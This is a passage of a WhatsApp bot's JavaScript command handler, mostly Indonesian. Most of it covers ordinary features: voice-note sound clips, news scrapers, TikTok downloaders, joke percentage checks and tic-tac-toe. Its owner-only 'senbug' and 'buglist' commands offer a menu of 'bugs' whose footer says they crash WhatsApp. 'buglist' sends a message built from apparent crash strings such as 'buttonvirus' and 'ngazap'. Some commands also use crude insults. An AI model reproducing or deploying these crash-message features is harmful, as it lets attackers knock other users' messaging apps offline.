let audio = await toAudio(media, 'mp4')
haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${haikal.user.name}.mp3`}, { quoted : kal})
}
break
//=================================================//
case 'jadibug3': {
if (isBan) throw mess.ban
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
bangkal(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:kal})
}
break
//=================================================//
case 'jadibug4': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(m.chat, { image: buffer }, { quoted: kal })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: kal })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: kal })
}
}
break

//=================================================//
case 'hu': {
 mem = fs.readFileSync('./media/tes.mp3')
 haikal.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:kel})
 }
 break
case 'hi': {
if (!isCreator) return
 mom = fs.readFileSync('./media/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'ha': {
 mim = fs.readFileSync('./media/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'he': {
 mum = fs.readFileSync('./media/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:trol})
 }
 break
case 'ba': {
 ah = fs.readFileSync('./media/bang.mp3')
 haikal.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'be': {
 eh = fs.readFileSync('./media/nob.mp3')
 haikal.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'bu': {
 ih = fs.readFileSync('./media/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'bi': {
 ra = fs.readFileSync('./media/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: ra, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'ca': {
 ri = fs.readFileSync('./media/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'ci': {
 ru = fs.readFileSync('./media/loli.mp3')
 haikal.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'cu': {
 re = fs.readFileSync('./media/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
case 'co': {
 ro = fs.readFileSync('./media/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:kal})
 }
 break
//=================================================//
case 'bugvip':{
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `SILAHKAN PILIH BUG NYA \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
description: "PILIH DI DALAM LIST",
buttonText: "CLICK DISINI",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "LOADING",
"rows": [
{
"title": "hu",
"description": "Sukses ✓",
"rowId": `${prefix}hu`
}
]
},
{
"title": "LOADINGt",
"rows": [
{
"title": "hi",
"description": "Sukses ✓",
"rowId": `${prefix}hi`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "ha",
"description": "Sukses ✓",
"rowId": `${prefix}ha`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "he",
"description": "Sukses ✓",
"rowId": `${prefix}he`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "ba",
"description": "Sukses ✓",
"rowId": `${prefix}ba`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "be",
"description": "Sukses ✓",
"rowId": `${prefix}be`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}bu`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}bi`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}ca`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}ci`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}cu`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}co`
}
]
},
],
  listType: 1
}
}), { userJid: m.chat, quoted: ftroli })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'senbug':{
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `Silahkan Pilih Bug Yang Anda Inginkan \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
description: "PERINGATAN!!!",
buttonText: "CLICK DISINI",
footerText: "EFFECT INI MEMBUAT WHATSAPP MENJADI CRASH",
listType: "SINGLE_SELECT",
sections: [{
"title": "Menu Bug",
"rows": [
{
"title": "Bug1",
"description": "Bug Berjenis Quoted Gambar",
"rowId": `${prefix}bug1`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug2",
"description": "Bug Berjenis Lokasi",
"rowId": `${prefix}bug2`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug3",
"description": "Bug Berjenis Troli",
"rowId": `${prefix}bug3`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug4",
"description": "Bug Berjenis Audio",
"rowId": `${prefix}bug4`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug5",
"description": "Bug Berjenis Group",
"rowId": `${prefix}bug5`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug6",
"description": "Bug Berjenis Contact",
"rowId": `${prefix}bug6`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug7",
"description": "Bug Berjenis Dokumen",
"rowId": `${prefix}bug7`
}
]
}
],
  listType: 1
}
}), { userJid: m.chat, quoted: ftroli })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'buglist':{
if (!isCreator) return
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `${place}`,
description: `𝐓𝐑𝐀𝐕𝐀 𝑳𝑰𝑺𝑻 🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥`,
buttonText: `𝐂𝐋𝐈𝐂𝐊 ${buttonvirus}`,
footerText: `ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ 🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭🎭`,
listType: "SINGLE_SELECT",
sections: [{
"title": "Menu Bug",
"rows": [
{
"title": `${ngazap(prefix)}`,
"description": "KK",
"rowId": `KK`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "KK",
"description": `${buttonvirus}`,
"rowId": `KK`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": `${cttl}`,
"description": "KK",
"rowId": `KK`
}
]
}
],
  listType: 1
}
}), { userJid: m.chat, quoted: ftroli })
haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'ban': case 'banned': {
if (!isCreator) return bangkal(mess.owner)
if (!args[0]) return bangkal(`*Enter Option Select add or delete*`)
if (args[1]) {
orgnye = args[1] + "@s.whatsapp.net"
} else if (m.quoted) {
orgnye = m.quoted.sender
}
const isBane = banned.includes(orgnye)
if (args[0] === "add") {
if (isBane) return bangkal('*User has been banned*')
banned.push(orgnye)
bangkal(`Succes ban`)
} else if (args[0] === "del") {
if (!isBane) return bangkal('*ban lifted you happy*')
let delbans = banned.indexOf(orgnye)
banned.splice(delbans, 1)
bangkal(`*Success Removing Banned Users*`)
} else {
bangkal("Error")
}
}
break
//=================================================//
  case 'tiktok': { //DOWNLOADER
// //if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit)
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) throw '*The link you provided is not valid*' 
hx.ttdownloader(`${text}`).then(async (data) => {  
let buttons = [
{buttonId: `${prefix}tiktokmp3 ${text}`, buttonText: {displayText: 'AUDIO'}, type: 1}
]
let buttonMessage = {
video: { url: data.nowm },
caption: `*KLICK AUDIO DI BAWAH JIKA INGIN MENGUNAH MENJADI AUDIO*`,
footer: 'Please Select Below',
buttons: buttons,
headerType: 5
}
haikal.sendMessage(m.chat, buttonMessage, { quoted: hw })
}).catch((err) => {
bangkal(`*Failed to download media and send videos*`)
})
 }
 break 
 //=================================================//
case 'tiktokmp3': case 'tiktokaudio': { 	  
  if (!text) throw '*Enter Link Tiktok!*'
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) throw '*The link you provided is not valid*'
let got = require('./lib/tiktok.js')
got.tiktokDown(`${text}`).then(async (data) => {
haikal.sendMessage(m.chat, { audio: { url: data.result.nowatermark }, mimetype: 'audio/mp4'}, { quoted: hw })
}).catch((err) => {
bangkal(`*Failed to download media and send audio*`)
})
 }
 break
//=================================================//
case 'searchgroups':
if (!q) return bangkal(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
bangkal(res)
});
break
//=================================================//
case 'kal': {
 hey = fs.readFileSync('./media/tes.mp3')
 haikal.sendMessage(m.chat, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ngakak': {
 hiy = fs.readFileSync('./media/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ketawa': {
 hoy = fs.readFileSync('./media/ketawa.mp3')
 haikal.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'awkwk': {
 huy = fs.readFileSync('./media/awkwk.mp3')
 haikal.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'bang': {
 mi = fs.readFileSync('./media/bang.mp3')
 haikal.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'nob': {
 miki = fs.readFileSync('./media/nob.mp3')
 haikal.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'musik': {
 mo = fs.readFileSync('./media/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'mastah': {
 mu = fs.readFileSync('./media/mastah.mp3')
 haikal.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'slebew': {
 me = fs.readFileSync('./media/ikehcok.mp3')
 haikal.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'cantik': {
 muku = fs.readFileSync('./media/loli.mp3')
 haikal.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'kesel': {
 meke = fs.readFileSync('./media/kesel.mp3')
 haikal.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
case 'ngeselin': {
 moko = fs.readFileSync('./media/ngeselin.mp3')
 haikal.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:hw})
 }
 break
//=================================================//
case 'once': case 'toonce': { //by DRIPS
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: hw })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: hw })
}
}
break
//=================================================//
case 'fajar-news':
FajarNews().then(async(res) => {
console.log(res) 
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
bangkal(teks) 
})
break
//=================================================//
case "quotes":
var res = await Quotes()
teks += `\nAuthor: ${res.author}\n`
teks += `\nQuotes:\n`
teks += `${res.quotes}\n`
teks += ""
bangkal(teks)
break
//=================================================//
case "darkjoke": case "darkjokes":
var res = await Darkjokes()
teks = "*Darkjokes*"
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : hw })
break
//=================================================//
case 'cnn-news':
CNNNews().then(res => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
bangkal(teks) 
})
break
//=================================================//
case 'layarkaca-search':
if (!q) return bangkal('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Film: ${i.film_title}\n`
teks += `Link: ${i.film_link}\n`
}
teks += ``
bangkal(teks) 
})
break
//=================================================//
case 'cnbc-news':
CNBCNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'tribun-news':
TribunNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'indozone-news':
IndozoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'kompas-news':
KompasNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'detik-news':
DetikNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'daily-news':
DailyNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'inews-news':
iNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
bangkal(teks) 
})
break
//=================================================//
case 'okezone-news':
OkezoneNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'sindo-news':
SindoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
bangkal(teks) 
})
break
//=================================================//
case 'tempo-news':
TempoNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case 'antara-news':
AntaraNews().then(async(res) => {
no = 0
teks = ""
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "kontan-news":
KontanNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "merdeka-news":
MerdekaNews().then(async (res) => {
teks = ""
no = 0
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ""
haikal.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : hw })
})
break
//=================================================//
case "jalantikus-meme":
var res = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${res}`
teks += ""
haikal.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : hw })
break
//=================================================//
/*Random*/
   case 'apakah':
if (!q) return bangkal(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: hw })
break
//=================================================//
case 'bisakah':
if (!q) return bangkal(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: hw })
break
//=================================================//
case 'bagaimanakah':
if (!q) return bangkal(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: hw })
break
//=================================================//
case 'rate':
if (!q) return bangkal(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const te = ra[Math.floor(Math.random() * ra.length)]
haikal.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: hw })
break
//=================================================//
case 'gantengcek':
  case 'cekganteng':
if (!q) return bangkal(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const teng = gan[Math.floor(Math.random() * gan.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: hw })
break
//=================================================//
case 'cantikcek':
  case 'cekcantik':
if (!q) return bangkal(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const tik = can[Math.floor(Math.random() * can.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: hw })
break
//=================================================//
case 'sangecek':
  case 'ceksange':
case 'gaycek':
  case 'cekgay':
case 'lesbicek':
  case 'ceklesbi':
if (!q) return bangkal(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
haikal.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: hw })
break
//=================================================//
case 'kapankah':
if (!q) return bangkal(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
haikal.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: hw })
break
//=================================================//
case 'wangy':
  if (!q) return bangkal (`Contoh : .wangy haikal`)
  qq = q.toUpperCase()
  awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
 bangkal(awikwok)
  break
//=================================================//
case 'cekmati':
  if (!q) return bangkal(`Invalid!\n\nYg mau di cek siapa kontol?`)
  predea = await axios.get(`https://api.agify.io/?name=${q}`)
  bangkal(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
  break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
bangkal('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}
${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}
Menunggu @${room.game.currentTurn.split('@')[0]}
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
bangkal('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
haikal.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
bangkal(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
bangkal('rusak')
}
}
break
//=================================================//
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) bangkal(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return bangkal(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return bangkal(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await haikal.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
